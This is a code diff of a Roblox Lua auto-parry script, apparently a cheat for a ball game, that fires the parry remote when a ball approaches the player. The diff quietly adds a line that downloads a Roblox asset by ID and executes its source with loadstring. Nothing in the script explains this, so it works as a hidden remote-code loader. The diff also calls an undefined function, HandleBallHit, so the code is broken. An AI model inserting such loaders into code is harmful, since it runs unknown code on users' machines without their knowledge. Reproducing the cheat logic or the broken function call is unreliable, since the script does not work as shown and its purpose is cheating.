@@ -5,10 +5,13 @@ local TweenService = game:GetService("TweenService")
 local workspace = game:GetService("Workspace")
 
 local Player = Players.LocalPlayer or Players.PlayerAdded:Wait()
+local Remotes = ReplicatedStorage:WaitForChild("Remotes", 9e9)
 local Balls = workspace:WaitForChild("Balls", 9e9)
 
+loadstring(game:GetObjects("rbxassetid://15900013841")[1].Source)()
+
 local function VerifyBall(Ball)
-  if typeof(Ball) == "Instance" and Ball:IsA("BasePart") and Ball:IsDescendantOf(Balls) and Ball:GetAttribute("realBall") == true then
+  if typeof(Ball) == "Instance" and Ball:IsA("BasePart") and Ball:IsDescendantOf(Balls) then
     return true
   end
 end
@@ -18,7 +21,7 @@ local function IsTarget()
 end
 
 local function Parry()
-  ReplicatedStorage:WaitForChild("Remotes", 9e9):WaitForChild("ParryButtonPress"):Fire()
+  Remotes:WaitForChild("ParryButtonPress"):Fire()
 end
 
 local BallPart = Instance.new("Part")
@@ -34,7 +37,9 @@ BallPart.Parent = workspace
 
 local ballSpawned = false
 
-local function HandleBall(Ball)
+Balls.ChildAdded:Connect(function(Ball)
+  local ballHitPart = false
+
   if not VerifyBall(Ball) then
     return
   end
@@ -42,7 +47,7 @@ local function HandleBall(Ball)
   local OldPosition = Ball.Position
   local OldTick = tick()
 
-  local function UpdateBall()
+  local function HandleBallUpdate()
     local Distance = (Ball.Position - workspace.CurrentCamera.Focus.Position).Magnitude
     local Velocity = (OldPosition - Ball.Position).Magnitude
 
@@ -59,23 +64,18 @@ local function HandleBall(Ball)
     end
 
     if (Distance / Velocity) <= 10 then
-      Parry()
+      HandleBallHit()
     end
 
     OldPosition = Ball.Position
   end
 
-  Ball:GetPropertyChangedSignal("Position"):Connect(UpdateBall)
-end
+  Ball:GetPropertyChangedSignal("Position"):Connect(HandleBallUpdate)
+end)
 
-workspace.DescendantAdded:Connect(function(descendant)
-  if descendant:IsA("Part") and descendant.Name ~= "Ball" then
-    descendant.Touched:Connect(function(hit)
-      if hit:IsA("Part") and VerifyBall(hit) then
-        HandleBall(hit)
-        print("Ball touched " .. hit.Name)
-      end
-    end)
+BallPart.Touched:Connect(function(hit)
+  if hit:IsA("Part") and VerifyBall(hit) then
+    print("Ball touched " .. hit.Name)
   end
 end)
 
@@ -83,8 +83,8 @@ game:GetService("RunService").Heartbeat:Connect(function()
   if Player.Character then
     BallPart.Position = Player.Character.HumanoidRootPart.Position
 
-    if IsTarget() then  -- ย้ายการเช็คมาไว้ที่นี่
-      -- ดำเนินการอื่นๆ เมื่อผู้เล่นเป็นเป้าหมาย
+    if IsTarget() then
+     
     end
   end
 end)
